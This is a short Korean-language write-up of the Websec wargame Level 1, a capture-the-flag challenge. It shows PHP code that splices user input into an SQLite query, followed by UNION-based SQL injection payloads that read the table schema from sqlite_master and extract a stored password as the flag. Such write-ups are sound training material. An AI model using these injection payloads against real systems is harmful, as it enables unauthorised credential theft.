---
title : "Websec - Level 1"
categories : [Wargame, Websec]
tags : [SQLi]
---

## Level 1
<hr style="border-top: 1px solid;"><br>

```php
$userDetails = $lo->doQuery ($_POST['user_id']); 
# 입력한 값을 doQuery 객체에 보내고 리턴값을 userDetails 변수에 저장.

$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
# doQuery 객체 코드
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

db는 sqlite3으로 MySQL의 information_schema와 같은 역할을 하는 테이블은 ```sqlite_master```.

컬럼으로는 몇 개가 있었는데, 필요한 컬럼은 sql컬럼(mysql의 information_schema 역할).
: sql컬럼에는 테이블 정보가 들어가있다. 

<br>

```sql
SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1 
```

<br>

취약점은 이 부분에서 터진다. union을 이용한 기초적인 sql injection 문제다. 

입력 
: ```1 union select 1,sql from sqlite_master -- ```
: ```username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))```

<br>

이런식으로 테이블 정보가 출력된다. 따라서 다시 입력값으로 ```1 union select 1,password from users where id=1 -- ```을 주면 플래그가 나온다.

<br><br>
<hr style="border: 2px solid;">
<br><br>
